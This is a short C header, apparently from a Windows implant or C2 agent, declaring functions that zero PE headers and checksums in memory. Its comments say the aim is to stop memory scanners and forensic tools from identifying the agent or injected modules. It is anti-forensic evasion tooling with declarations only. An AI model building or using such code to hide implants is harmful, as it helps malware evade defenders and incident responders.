/*
 * pe_stomp.h — PE header stomping and resource masking.
 *
 * After the agent loads, its PE headers in memory are no longer needed
 * by the loader. Zeroing them prevents memory scanners from identifying
 * the agent as a PE file and extracting metadata (imports, sections, etc.).
 */
#ifndef PE_STOMP_H
#define PE_STOMP_H

#include <windows.h>

/*
 * Stomp the PE headers of the current process image.
 * Zeros the DOS header, NT headers, and section headers.
 * The .text/.data sections remain intact — only metadata is removed.
 *
 * This must be called AFTER all initialization that reads PE headers
 * (e.g., _get_module_bounds, evasion_init, etc.).
 *
 * Returns TRUE on success.
 */
BOOL pe_stomp_self(void);

/*
 * Stomp PE headers of a specific module (by base address).
 * Useful for stomping loaded DLLs or injected images.
 */
BOOL pe_stomp_module(HMODULE hMod);

/*
 * Overwrite the PE checksum field to zero.
 * Less aggressive than full stomp — just removes one forensic artifact.
 */
BOOL pe_zero_checksum(HMODULE hMod);

#endif /* PE_STOMP_H */
